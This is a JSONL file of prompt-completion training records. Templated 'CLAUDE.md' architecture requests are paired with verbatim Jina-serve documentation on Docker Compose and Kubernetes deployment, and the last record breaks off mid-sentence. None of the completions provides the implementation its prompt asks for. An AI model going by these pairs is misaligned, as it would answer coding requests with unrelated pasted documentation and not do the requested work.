{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(docker-compose)=\n# {fab}`docker` Docker Compose Support\n\nOne of the simplest ways to prototype or serve in\nproduction is to run your {class}`~jina.Flow` with `docker-compose`.\n\nA {class}`~jina.Flow` is composed of {class}`~jina.Executor`s which run Python code\nthat operates on `Documents`. These `Executors` live in different runtimes depending on how you want to deploy\nyour Flow. \n\nBy default, if you are serving your Flow locally they live within processes. Nevertheless, \nbecause Jina-serve is cloud native your Flow can easily manage Executors that live in containers and that are\norchestrated by your favorite tools. One of the simplest is Docker Compose which is supported out of the box. \n\nYou can deploy a Flow with Docker Compose in one line:\n\n\n```{code-block} python\n---\nemphasize-lines: 3\n---\nfrom jina import Flow\nflow = Flow(...).add(...).add(...)\nflow.to_docker_compose_yaml('docker-compose.yml')\n```\n\nJina-serve generates a `docker-compose.yml` configuration file corresponding with your Flow. You can use this directly with \nDocker Compose, avoiding the overhead of manually defining all of your Flow's services.\n\n````{admonition} Use Docker-based Executors\n:class: caution\nAll Executors in the Flow should be used with `jinaai+docker://...` or `docker://...`.\n````\n\n````{admonition} Health check available from 3.1.3\n:class: caution\nIf you use Executors that rely on Docker images built with a version of Jina-serve prior to 3.1.3, remove the \nhealth check from the dumped YAML file, otherwise your Docker Compose services will \nalways be \"unhealthy.\"\n````\n\n````{admonition} Matching Jina-serve versions\n:class: caution\nIf you change the Docker images in your Docker Compose generated file, ensure that all services included in\nthe Gateway are built with the same Jina-serve version to guarantee compatibility.\n````\n\n## Example: Index and search text using your own built Encoder and Indexer\n\nInstall [`Docker Compose`](https://docs.docker.com/compose/install/) locally before starting this tutorial.\n\nFor this example we recommend that you read {ref}`how to build and containerize the Executors to be run in Kubernetes. <build-containerize-for-k8s>`\n\n### Deploy the Flow\n\nFirst define the Flow and generate the Docker Compose YAML configuration:\n\n\n````{tab} YAML\nIn a `flow.yml` file :\n```yaml\njtype: Flow\nwith:\n  port: 8080\n  protocol: http\nexecutors:\n- name: encoder\n  uses: jinaai+docker://<user-id>/EncoderPrivate\n  replicas: 2\n- name: indexer\n  uses: jinaai+docker://<user-id>/IndexerPrivate\n  shards: 2\n```\nThen in a shell run:\n```shell\njina export docker-compose flow.yml docker-compose.yml \n```\n````\n\n\n````{tab} Python\nIn python run\n```python\nfrom jina import Flow\n\nflow = (\n    Flow(port=8080, protocol='http')\n    .add(name='encoder', uses='jinaai+docker://<user-id>/EncoderPrivate', replicas=2)\n    .add(\n        name='indexer',\n        uses='jinaai+docker://<user-id>/IndexerPrivate',\n        shards=2,\n    )\n)\nflow.to_docker_compose_yaml('docker-compose.yml')\n```\n````\n\n````{admonition} Hint\n:class: hint\nYou can use a custom jina Docker image for the Gateway service by setting the environment variable `JINA_GATEWAY_IMAGE` to the desired image before generating the configuration.\n````\n\nlet's take a look at the generated compose file:\n```yaml\nversion: '3.3'\n...\nservices:\n  encoder-rep-0:  # # # # # # # # # # #          \n                  #     Encoder       #\n  encoder-rep-1:  # # # # # # # # # # #\n\n  indexer-head:   # # # # # # # # # # #          \n                  #                   #\n  indexer-0:      #     Indexer       #\n                  #                   #\n  indexer-1:      # # # # # # # # # # #\n\n  gateway: \n    ...\n    ports:\n    - 8080:8080\n```\n\n```{tip} \n:class: caution\nThe default compose file generated by the Flow contains no special configuration or settings. You may want to \nadapt it to your own needs.\n```\n\nYou can see that six services are created:\n\n- 1 for the **Gateway** which is the entrypoint of the **Flow**.\n- 2 associated with the encoder for the two Replicas.\n- 3 associated with the indexer, one for the Head and two for the Shards.\n\nNow, you can deploy this Flow :\n\n```shell\ndocker-compose -f docker-compose.yml up\n```\n\n### Query the Flow\n\nOnce we see that all the services in the Flow are ready, we can send index and search requests.\n\nFirst define a client:\n```python\nfrom jina.clients import Client\n\nclient = Client(host='http://localhost:8080')\n```\n\n\n```python\nfrom typing import List, Optional\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass MyDocWithMatches(MyDoc):\n    matches: DocList[MyDoc] = []\n    scores: List[float] = []\n\ndocs = client.post(\n    '/index',\n    inputs=DocList[MyDoc]([MyDoc(text=f'This is document indexed number {i}') for i in range(100)]),\n    return_type=DocList[MyDoc],\n    request_size=10\n)\n\nprint(f'Indexed documents: {len(docs)}')\ndocs = client.post(\n    '/search',\n    inputs=DocList[MyDoc]([MyDoc(text=f'This is document query number {i}') for i in range(10)]),\n    return_type=DocList[MyDocWithMatches],\n    request_size=10\n)\nfor doc in docs:\n    print(f'Query {doc.text} has {len(doc.matches)} matches')\n```\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "docs/cloud-nativeness/docker-compose.md", "language": "markdown", "complexity": "medium", "star_count": 21665, "quality_score": 0.9500000000000001, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 187}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kubernetes-docs)=\n# {fas}`dharmachakra` Kubernetes Support\n\n```{toctree}\n:hidden:\n\nkubernetes\n```\n\nJina-serve is a cloud-native framework and therefore runs natively and easily on Kubernetes.\nDeploying a Jina-serve Deploymenr or Flow on Kubernetes is actually the recommended way to use Jina-serve in production.\n\nA {class}`~jina.Deployment` and {class}`~jina.Flow` are services composed of single or multiple microservices called {class}`~jina.Executor` and {class}`~jina.Gateway`s which natively run in containers. This means that Kubernetes can natively take over the lifetime management of Executors. \n\nDeploying a {class}`~jina.Deployment` or `~jina.Flow` on Kubernetes means wrapping these services containers in the appropriate K8s abstraction (Deployment, StatefulSet, and so on), exposing them internally via K8s service and connecting them together by passing the right set of parameters.\n\n```{hint}\nThis documentation is designed for users who want to **manually** deploy a Jina-serve project on Kubernetes.\n\nCheck out {ref}`jcloud` if you want a **one-click** solution to deploy and host Jina, leveraging a cloud-native stack of Kubernetes, Prometheus and Grafana, **without worrying about provisioning**.\n```\n\n\n## Automatically translate a Deployment or Flow to Kubernetes concept\n\n```{hint}\nManually building these Kubernetes YAML object is long and cumbersome. Therefore we provide a helper function {meth}`~jina.Flow.to_kubernetes_yaml` that does most of this\ntranslation work automatically. \n```\n\nThis helper function can be called from:\n* Jina-serve's Python interface to translate a Flow defined in Python to K8s YAML files\n* Jina-serve's CLI interface to export a YAML Flow to K8s YAML files\n\n```{seealso}\nMore detail in the {ref}`Deployment export documentation<deployment-kubernetes-export>` and {ref}`Flow export documentation <flow-kubernetes-export>`\n```\n\n## Extra Kubernetes options\n\nIn general, Jina-serve follows a single principle when it comes to deploying in Kubernetes:\nYou, the user, know your use case and requirements the best.\nThis means that, while Jina-serve generates configurations for you that run out of the box, as a professional user you should always see them as just a starting point to get you off the ground.\n\n```{hint}\nThe export function {meth}`~jina.Deployment.to_kubernetes_yaml` and {meth}`~jina.Flow.to_kubernetes_yaml` are helper functions to get your stared off the ground. **There are meant to be updated and adapted to every use case**\n```\n````{admonition} Matching Jina versions\n:class: caution\nIf you change the Docker images for {class}`~jina.Executor` and {class}`~jina.Gateway` in your Kubernetes-generated file, ensure that all of them are built with the same Jina-serve version to guarantee compatibility.\n````\n\nYou can't add basic Kubernetes features like `Secrets`, `ConfigMap` or `Labels` via the Pythonic or YAML interface. This is intentional and doesn't mean that we don't support these features. On the contrary, we let you fully express your Kubernetes configuration by using the Kubernetes API to add your own Kubernetes standard to Jina-serve.\n\n````{admonition} Hint\n:class: hint\nWe recommend you dump the Kubernetes configuration files and then edit them to suit your needs.\n````\n\nHere are possible configuration options you may need to add or change\n\n- Add labels `selector`s to the Deployments to suit your case\n- Add `requests` and `limits` for the resources of the different Pods \n- Set up persistent volume storage to save your data on disk\n- Pass custom configuration to your Executor with `ConfigMap` \n- Manage credentials of your Executor with Kubernetes secrets, you can use `f.add(..., env_from_secret={'SECRET_PASSWORD': {'name': 'mysecret', 'key': 'password'}})` to map them to Pod environment variables\n- Edit the default rolling update configuration\n\n\n(service-mesh-k8s)=\n## Required service mesh\n\n```{caution}\nA Service Mesh is required to be installed and correctly configured in the K8s cluster in which your deployed your Flow.\n```\n\nService meshes work by attaching a tiny proxy to each of your Kubernetes Pods, allowing for smart rerouting, load balancing, request retrying, and host of [other features](https://linkerd.io/2.11/features/).\n\nJina relies on a service mesh to load balance requests between replicas of the same Executor.\nYou can use your favourite Kubernetes service mesh in combination with your Jina services, but the configuration files\ngenerated by `to_kubernetes_yaml()` already include all necessary annotations for the [Linkerd service mesh](https://linkerd.io).\n\n````{admonition} Hint\n:class: hint\nYou can use any service mesh with Jina-serve, but Jina-serve Kubernetes configurations come with Linkerd annotations out of the box.\n````\n\nTo use Linkerd you can follow the [install the Linkerd CLI guide](https://linkerd.io/2.11/getting-started/).\n\n````{admonition} Caution\n:class: caution\n\nMany service meshes can perform retries themselves.\nBe careful about setting up service mesh level retries in combination with Jina, as it may lead to unwanted behaviour in combination with\nJina's own {ref}`retry policy <flow-error-handling>`.\n\nInstead, you can disable Jina level retries by setting `Flow(retries=0)` in Python, or `retries: 0` in the Flow\nYAML's `with` block.\n````\n\n(kubernetes-replicas)=\n## Scaling Executors: Replicas and shards\n\nJina supports two types of scaling:\n\n- **Replicas** can be used with any Executor type and are typically used for performance and availability.\n- **Shards** are used for partitioning data and should only be used with indexers since they store state.\n\nCheck {ref}`here <scale-out>` for more information about these scaling mechanisms.\n\nFor shards, Jina creates one separate Deployment in Kubernetes per Shard.\nSetting `Deployment(..., shards=num_shards)` is sufficient to create a corresponding Kubernetes configuration.\n\nFor replicas, Jina-serve uses [Kubernetes native replica scaling](https://kubernetes.io/docs/tutorials/kubernetes-basics/scale/scale-intro/) and **relies on a service mesh** to load-balance requests between replicas of the same Executor.\nWithout a service mesh installed in your Kubernetes cluster, all traffic will be routed to the same replica.\n\n````{admonition} See Also\n:class: seealso\n\nThe impossibility of load balancing between different replicas is a limitation of Kubernetes in combination with gRPC.\nIf you want to learn more about this limitation, see [this](https://kubernetes.io/blog/2018/11/07/grpc-load-balancing-on-kubernetes-without-tears/) Kubernetes Blog post.\n````\n\n## Scaling the Gateway\nThe {ref}`Gateway <gateway>` is responsible for providing the API of the {ref}`Flow <flow>`.\nIf you have a large Flow with many Clients and many replicated Executors, the Gateway can become the bottleneck.\nIn this case you can also scale up the Gateway deployment to be backed by multiple Kubernetes Pods. For this reason, you can add `replicas` parameter to your Gateway before converting the Flow to Kubernetes.\nThis can be done in a Pythonic way or in YAML:\n\n````{tab} Using Python\n\nYou can use {meth}`~jina.Flow.config_gateway` to add `replicas` parameter\n```python\nfrom jina import Flow\n\nf = Flow().config_gateway(replicas=3).add()\n\nf.to_kubernetes_yaml('./k8s_yaml_path')\n```\n````\n\n````{tab} Using YAML\nYou can add `replicas` in the `gateway` section of your Flow YAML\n```yaml\njtype: Flow\ngateway:\n    replicas: 3\nexecutors:\n  - name: encoder\n```\n````\n\nAlternatively, this can be done by the regular means of Kubernetes: Either increase the number of replicas in the {ref}`generated yaml configuration files <kubernetes-export>` or [add replicas while running](https://kubernetes.io/docs/concepts/workloads/controllers/deployment/#scaling-a-deployment).\nTo expose your Gateway replicas outside Kubernetes, you can add a load balancer as described {ref}`here <kubernetes-expose>`.\n\n````{admonition} Hint\n:class: hint\nYou can use a custom Docker image for the Gateway deployment by setting the environment variable `JINA_GATEWAY_IMAGE` to the desired image before generating the configuration.\n````\n\n## See also\n- {ref}`Step by step deployment of a Jina-serve Flow on Kubernetes <kubernetes>`\n- {ref}`Export a Flow to Kubernetes <kubernetes-export>`\n- {meth}`~jina.Flow.to_kubernetes_yaml`\n- {ref}`Deploy a standalone Executor on Kubernetes <kubernetes-executor>`\n- [Kubernetes Documentation](https://kubernetes.io/docs/home/)\n", "metadata": {"source": "github.com/jina-ai/serve", "file_path": "docs/cloud-nativeness/k8s.md", "language": "markdown", "complexity": "medium", "star_count": 21665, "quality_score": 0.89, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 167}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design microservices architecture with service communication patterns using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kubernetes)=\n# Deploy on Kubernetes\n\nThis how-to will go through deploying a Deployment and a simple Flow using Kubernetes, customizing the Kubernetes configuration\nto your needs, and scaling Executors using replicas and shards.\n\nDeploying Jina-serve services in Kubernetes is the recommended way to use Jina-serve in production because Kubernetes can easily take over the lifetime management of Executors and Gateways.  \n\n```{seelaso}\nThis page is a step by step guide, refer to the {ref}`Kubernetes support documentation <kubernetes-docs>` for more details\n```\n\n\n```{hint}\nThis guide is designed for users who want to **manually** deploy a Jina-serve project on Kubernetes.\n\nCheck out {ref}`jcloud` if you want a **one-click** solution to deploy and host Jina, leveraging a cloud-native stack of Kubernetes, Prometheus and Grafana, **without worrying about provisioning**.\n```\n\n\n## Preliminaries\n\nTo follow this how-to, you need access to a Kubernetes cluster.\n\nYou can either set up [`minikube`](https://minikube.sigs.k8s.io/docs/start/), or use one of many managed Kubernetes\nsolutions in the cloud:\n- [Google Kubernetes Engine](https://cloud.google.com/kubernetes-engine)\n- [Amazon EKS](https://aws.amazon.com/eks)\n- [Azure Kubernetes Service](https://azure.microsoft.com/en-us/services/kubernetes-service)\n- [Digital Ocean](https://www.digitalocean.com/products/kubernetes/)\n\nYou need to install Linkerd in your K8s cluster. To use Linkerd, [install the Linkerd CLI](https://linkerd.io/2.11/getting-started/) and [its control plane](https://linkerd.io/2.11/getting-started/) in your cluster.\nThis automatically sets up and manages the service mesh proxies when you deploy the Flow.\n\nTo understand why you need to install a service mesh like Linkerd refer to this  {ref}`section <service-mesh-k8s>`\n\n(build-containerize-for-k8s)=\n## Build and containerize your Executors\n\nFirst, we need to build the Executors that we are going to use and containerize them {ref}`manually <dockerize-exec>` or by leveraging {ref}`Executor Hub <jina-hub>`. In this example,\nwe are going to use the Hub.\n\nWe are going to build two Executors, the first is going to use `CLIP` to encode textual Documents, and the second is going to use an in-memory vector index. This way \nwe can build a simple neural search system.\n\nFirst, we build the encoder Executor.\n\n````{tab} executor.py\n```{code-block} python\nimport torch\nfrom typing import Optional\nfrom transformers import CLIPModel, CLIPTokenizer\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\nfrom jina import Executor, requests\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass Encoder(Executor):\n    def __init__(\n            self, pretrained_model_name_or_path: str = 'openai/clip-vit-base-patch32', device: str = 'cpu', *args,**kwargs ):\n        super().__init__(*args, **kwargs)\n        self.device = device\n        self.tokenizer = CLIPTokenizer.from_pretrained(pretrained_model_name_or_path)\n        self.model = CLIPModel.from_pretrained(pretrained_model_name_or_path)\n        self.model.eval().to(device)\n\n    def _tokenize_texts(self, texts):\n        x = self.tokenizer(\n            texts,\n            max_length=77,\n            padding='longest',\n            truncation=True,\n            return_tensors='pt',\n        )\n        return {k: v.to(self.device) for k, v in x.items()}\n\n    @requests\n    def encode(self, docs: DocList[MyDoc], **kwargs) -> DocList[MyDoc]:\n        with torch.inference_mode():\n            input_tokens = self._tokenize_texts(docs.text)\n            docs.embedding = self.model.get_text_features(**input_tokens).cpu().numpy()\n        return docs\n\n```\n````\n````{tab} requirements.txt\n```\ntorch==1.12.0\ntransformers==4.16.2\n```\n````\n````{tab} config.yml\n```\njtype: Encoder\nmetas:\n  name: EncoderPrivate\n  py_modules:\n    - executor.py\n```\n````\n\nPutting all these files into a folder named CLIPEncoder and calling `jina hub push CLIPEncoder --private` should give:\n\n```shell\n╭────────────────────────── Published ───────────────────────────╮\n│                                                                │\n│   📛 Name           EncoderPrivate                         │\n│   🔗 Jina Hub URL   https://cloud.jina.ai/executor/<executor-id>/   │\n│   👀 Visibility     private                                    │\n│                                                                │\n╰────────────────────────────────────────────────────────────────╯\n╭───────────────────────────────────────────────────── Usage ─────────────────────────────────────────────────────╮\n│                                                                                                                 │\n│   Container   YAML     uses: jinaai+docker://<user-id>/EncoderPrivate:latest           │\n│               Python   .add(uses='jinaai+docker://<user-id>/EncoderPrivate:latest')    │\n│                                                                                                                 │\n│   Source      YAML     uses: jinaai://<user-id>/EncoderPrivate:latest                  │\n│               Python   .add(uses='jinaai://<user-id>/EncoderPrivate:latest')           │\n│                                                                                                                 │\n╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯\n```\n\nThen we can build an indexer to provide `index` and `search` endpoints:\n\n````{tab} executor.py\n```{code-block} python\nfrom typing import Optional, List\nfrom docarray import DocList, BaseDoc\nfrom docarray.index import InMemoryExactNNIndex\nfrom docarray.typing import NdArray\nfrom jina import Executor, requests\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass MyDocWithMatches(MyDoc):\n    matches: DocList[MyDoc] = []\n    scores: List[float] = []\n\n\nclass Indexer(Executor):\n    def __init__(self, *args, **kwargs):\n        super().__init__(*args, **kwargs)\n        self._indexer = InMemoryExactNNIndex[MyDoc]()\n\n    @requests(on='/index')\n    def index(self, docs: DocList[MyDoc], **kwargs) -> DocList[MyDoc]:\n        self._indexer.index(docs)\n        return docs\n\n    @requests(on='/search')\n    def search(self, docs: DocList[MyDoc], **kwargs) -> DocList[MyDocWithMatches]:\n        res = DocList[MyDocWithMatches]()\n        ret = self._indexer.find_batched(docs, search_field='embedding')\n        matched_documents = ret.documents\n        matched_scores = ret.scores\n        for query, matches, scores in zip(docs, matched_documents, matched_scores):\n            output_doc = MyDocWithMatches(**query.dict())\n            output_doc.matches = matches\n            output_doc.scores = scores.tolist()\n            res.append(output_doc)\n        return res\n\n```\n````\n````{tab} config.yml\n```\njtype: Indexer\nmetas:\n  name: IndexerPrivate\n  py_modules:\n    - executor.py\n```\n````\n\nPutting all these files into a folder named Indexer and calling `jina hub push Indexer --private` should give:\n\n```shell\n╭────────────────────────── Published ───────────────────────────╮\n│                                                                │\n│   📛 Name           IndexerPrivate                         │\n│   🔗 Jina Hub URL   https://cloud.jina.ai/executor/<executor-id>/   │\n│   👀 Visibility     private                                    │\n│                                                                │\n╰────────────────────────────────────────────────────────────────╯\n╭───────────────────────────────────────────────────── Usage ─────────────────────────────────────────────────────╮\n│                                                                                                                 │\n│   Container   YAML     uses: jinaai+docker://<user-id>/IndexerPrivate:latest           │\n│               Python   .add(uses='jinaai+docker://<user-id>/IndexerPrivate:latest')    │\n│                                                                                                                 │                      │\n│   Source      YAML     uses: jinaai://<user-id>/IndexerPrivate:latest                  │\n│               Python   .add(uses='jinaai://<user-id>/IndexerPrivate:latest')           │\n│                                                                                                                 │\n╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯\n```\n\nNow, since we have created private Executors, we need to make sure that K8s has the right credentials to download\nfrom the private registry:\n\nFirst, we need to create the namespace where our Flow will run:\n\n```shell\nkubectl create namespace custom-namespace\n```\n\nSecond, we execute this python script:\n\n```python\nimport json\nimport os\nimport base64\n\nJINA_CONFIG_JSON_PATH = os.path.join(os.path.expanduser('~'), os.path.join('.jina', 'config.json'))\nCONFIG_JSON = 'config.json'\n\nwith open(JINA_CONFIG_JSON_PATH) as fp:\n    auth_token = json.load(fp)['auth_token']\n\nconfig_dict = dict()\nconfig_dict['auths'] = dict()\nconfig_dict['auths']['registry.hubble.jina.ai'] = {'auth': base64.b64encode(f'<token>:{auth_token}'.encode()).decode()}\n\nwith open(CONFIG_JSON, mode='w') as fp:\n    json.dump(config_dict, fp)\n```\n\nFinally, we add a secret to be used as [imagePullSecrets](https://kubernetes.io/docs/tasks/configure-pod-container/pull-image-private-registry/) in the namespace from our config.json:\n\n```shell script\nkubectl -n custom-namespace create secret generic regcred --from-file=.dockerconfigjson=config.json --type=kubernetes.io/dockerconfigjson\n```\n\n## Deploy an embedding model inside a Deployment\n\nNow we are ready to first deploy our embedding model as an embedding service in Kubernetes.\n\nFor now, define a Deployment,\neither in {ref}`YAML <deployment-yaml-spec>` or directly in Python, as we do here:\n\n```python\nfrom jina import Deployment\n\nd = Deployment(port=8080, name='encoder', uses='jinaai+docker://<user-id>/EncoderPrivate', image_pull_secrets=['regcred'])\n```\n\nYou can serve any Deployment you want.\nJust ensure that the Executor is containerized, either by using *'jinaai+docker'*, or by {ref}`containerizing your local\nExecutors <dockerize-exec>`.\n\nNext, generate Kubernetes YAML configs from the Flow. Notice, that this step may be a little slow, because [Executor Hub](https://cloud.jina.ai/) may \nadapt the image to your Jina-serve and docarray version.\n\n```python\nd.to_kubernetes_yaml('./k8s_deployment', k8s_namespace='custom-namespace')\n```\n\nThe following file structure will be generated - don't worry if it's slightly different -- there can be \nchanges from one Jina-serve version to another:\n\n```\n.\n└── k8s_deployment\n    └── encoder.yml\n```\n\nYou can inspect these files to see how Deployment and Executor concepts are mapped to Kubernetes entities.\nAnd as always, feel free to modify these files as you see fit for your use case.\n\n````{admonition} Caution: Executor YAML configurations\n:class: caution\n\nAs a general rule, the configuration files produced by `to_kubernetes_yaml()` should run out of the box, and if you strictly\nfollow this how-to they will.\n\nHowever, there is an exception to this: If you use a local dockerized Executor, and this Executors configuration is stored\nin a file other than `config.yaml`, you will have to adapt this Executor's Kubernetes YAML.\nTo do this, open the file and replace `config.yaml` with the actual path to the Executor configuration.\n\nThis is because when a Flow contains a Docker image, it can't see what Executor\nconfiguration was used to create that image.\nSince all of our tutorials use `config.yaml` for that purpose, the Flow uses this as a best guess.\nPlease adapt this if you named your Executor configuration file differently.\n````\n\nNext you can actually apply these configuration files to your cluster, using `kubectl`.\nThis launches the Deployment service.\n\nNow, deploy this Deployment to your cluster:\n```shell\nkubectl apply -R -f ./k8s_deployment\n```\n\nCheck that the Pods were created:\n```shell\nkubectl get pods -n custom-namespace\n```\n\n```text\nNAME                              READY   STATUS    RESTARTS   AGE\nencoder-81a5b3cf9-ls2m3           1/1     Running   0          60m\n```\n\nOnce you see that the Deployment ready, you can start embedding documents:\n\n```python\nfrom typing import Optional\nimport portforward\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\n\nfrom jina.clients import Client\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nwith portforward.forward('custom-namespace', 'encoder-81a5b3cf9-ls2m3', 8080, 8080):\n    client = Client(host='localhost', port=8080)\n    client.show_progress = True\n    docs = client.post(\n        '/encode',\n        inputs=DocList[MyDoc]([MyDoc(text=f'This is document indexed number {i}') for i in range(100)]),\n        return_type=DocList[MyDoc],\n        request_size=10\n    )\n\n    for doc in docs:\n        print(f'{doc.text}: {doc.embedding}')\n\n```\n\n## Deploy a simple Flow\n\nNow we are ready to build a Flow composed of multiple Executors.\n\nBy *simple* in this context we mean a Flow without replicated or sharded Executors - you can see how to use those in\nKubernetes {ref}`later on <kubernetes-replicas>`.\n\nFor now, define a Flow,\neither in {ref}`YAML <flow-yaml-spec>` or directly in Python, as we do here:\n\n```python\nfrom jina import Flow\n\nf = (\n    Flow(port=8080, image_pull_secrets=['regcred'])\n    .add(name='encoder', uses='jinaai+docker://<user-id>/EncoderPrivate')\n    .add(\n        name='indexer',\n        uses='jinaai+docker://<user-id>/IndexerPrivate',\n    )\n)\n```\n\nYou can essentially define any Flow of your liking.\nJust ensure that all Executors are containerized, either by using *'jinaai+docker'*, or by {ref}`containerizing your local\nExecutors <dockerize-exec>`.\n\nThe example Flow here simply encodes and indexes text data using two Executors pushed to the [Executor Hub](https://cloud.jina.ai/).\n \nNext, generate Kubernetes YAML configs from the Flow. Notice, that this step may be a little slow, because [Executor Hub](https://cloud.jina.ai/) may \nadapt the image to your Jina-serve and docarray version.\n\n```python\nf.to_kubernetes_yaml('./k8s_flow', k8s_namespace='custom-namespace')\n```\n\nThe following file structure will be generated - don't worry if it's slightly different -- there can be \nchanges from one Jina-serve version to another:\n\n```\n.\n└── k8s_flow\n    ├── gateway\n    │   └── gateway.yml\n    └── encoder\n    │   └── encoder.yml\n    └── indexer\n        └── indexer.yml\n```\n\nYou can inspect these files to see how Flow concepts are mapped to Kubernetes entities.\nAnd as always, feel free to modify these files as you see fit for your use case.\n\nNext you can actually apply these configuration files to your cluster, using `kubectl`.\nThis launches all Flow microservices.\n\nNow, deploy this Flow to your cluster:\n```shell\nkubectl apply -R -f ./k8s_flow\n```\n\nCheck that the Pods were created:\n```shell\nkubectl get pods -n custom-namespace\n```\n\n```text\nNAME                              READY   STATUS    RESTARTS   AGE\nencoder-8b5575cb9-bh2x8           1/1     Running   0          60m\ngateway-66d5f45ff5-4q7sw          1/1     Running   0          60m\nindexer-8f676fc9d-4fh52           1/1     Running   0          60m\n```\n\nNote that the Jina gateway was deployed with name `gateway-7df8765bd9-xf5tf`.\n\nOnce you see that all the Deployments in the Flow are ready, you can start indexing documents:\n\n```python\nfrom typing import List, Optional\nimport portforward\nfrom docarray import DocList, BaseDoc\nfrom docarray.typing import NdArray\n\nfrom jina.clients import Client\n\n\nclass MyDoc(BaseDoc):\n    text: str\n    embedding: Optional[NdArray] = None\n\n\nclass MyDocWithMatches(MyDoc):\n    matches: DocList[MyDoc] = []\n    scores: List[float] = []\n\n\nwith portforward.forward('custom-namespace', 'gateway-66d5f45ff5-4q7sw', 8080, 8080):\n    client = Client(host='localhost', port=8080)\n    client.show_progress = True\n    docs = client.post(\n        '/index',\n        inputs=DocList[MyDoc]([MyDoc(text=f'This is document indexed number {i}') for i in range(100)]),\n        return_type=DocList[MyDoc],\n        request_size=10\n    )\n\n    print(f'Indexed documents: {len(docs)}')\n    docs = client.post(\n        '/search',\n        inputs=DocList[MyDoc]([MyDoc(text=f'This is document query number {i}') for i in range(10)]),\n        return_type=DocList[MyDocWithMatches],\n        request_size=10\n    )\n    for doc in docs:\n        print(f'Query {doc.text} has {len(doc.matches)} matches')\n\n```\n\n### Deploy with shards and replicas\n\nAfter your service mesh is installed, your cluster is ready to run a Flow with scaled Executors.\nYou can adapt the Flow from above to work with two replicas for the encoder, and two shards for the indexer:\n\n```python\nfrom jina import Flow\n\nf = (\n    Flow(port=8080, image_pull_secrets=['regcred'])\n    .add(name='encoder', uses='jinaai+docker://<user-id>/CLIPEncoderPrivate', replicas=2)\n    .add(\n        name='indexer',\n        uses='jinaai+docker://<user-id>/IndexerPrivate',\n        shards=2,\n    )\n)\n```\n\nAgain, you can generate your Kubernetes configuration:\n\n```python\nf.to_kubernetes_yaml('./k8s_flow', k8s_namespace='custom-namespace')\n```\n\nNow you should see the following file structure:\n\n```\n.\n└── k8s_flow\n    ├── gateway\n    │   └── gateway.yml\n    └── encoder\n    │   └─ encoder.yml\n    └── indexer\n        ├── indexer-0.yml\n        ├── indexer-1.yml\n        └── indexer-head.yml\n```\n\nApply your configuration like usual:\n\n````{admonition} Hint: Cluster cleanup\n:class: hint\nIf you already have the simple Flow from the first example running on your cluster, make sure to delete it using `kubectl delete -R -f ./k8s_flow`.\n````\n\n```shell\nkubectl apply -R -f ./k8s_flow\n```\n\n### Deploy with custom environment variables and secrets\n\nYou can customize the environment variables that are available inside runtime, either defined directly or read from a [Kubernetes secret](https://kubernetes.io/docs/concepts/configuration/secret/):\n\n````{tab} with Python\n```python\nfrom jina import Flow\n\nf = (\n    Flow(port=8080, image_pull_secrets=['regcred'])\n    .add(\n        name='indexer',\n        uses='jinaai+docker://<user-id>/IndexerPrivate',\n        env={'k1': 'v1', 'k2': 'v2'},\n        env_from_secret={\n            'SECRET_USERNAME': {'name': 'mysecret', 'key': 'username'},\n            'SECRET_PASSWORD': {'name': 'mysecret', 'key': 'password'},\n        },\n    )\n)\n\nf.to_kubernetes_yaml('./k8s_flow', k8s_namespace='custom-namespace')\n```\n````\n````{tab} with flow YAML\nIn a `flow.yml` file :\n```yaml\njtype: Flow\nversion: '1'\nwith:\n  protocol: http\nexecutors:\n- name: indexer\n  uses: jinaai+docker://<user-id>/IndexerPrivate\n  env:\n    k1: v1\n    k2: v2\n  env_from_secret:\n    SECRET_USERNAME:\n      name: mysecret\n      key: username\n    SECRET_PASSWORD:\n      name: mysecret\n      key: password\n```\n\nYou can generate Kubernetes YAML configs using `jina export`:\n```shell\njina export kubernetes flow.yml ./k8s_flow --k8s-namespace custom-namespace\n```\n````\n\nAfter creating the namespace, you need to create the secrets mentioned above:\n\n```shell\nkubectl -n custom-namespace create secret generic mysecret --from-literal=username=jina --from-literal=password=123456\n```\n\nThen you can apply your configuration.\n\n\n(kubernetes-expose)=\n## Exposing the service\nThe previous examples use port-forwarding to send documents to the services. \nIn real world applications, \nyou may want to expose your service to make it reachable by users so that you can serve search requests.\n\n```{caution}\nExposing the Deployment or Flow only works if the environment of your `Kubernetes cluster` supports `External Loadbalancers`.\n```\n\nOnce the service is deployed, you can expose a service. In this case we give an example of exposing the encoder when using a Deployment,\nbut you can expose the gateway service when using a 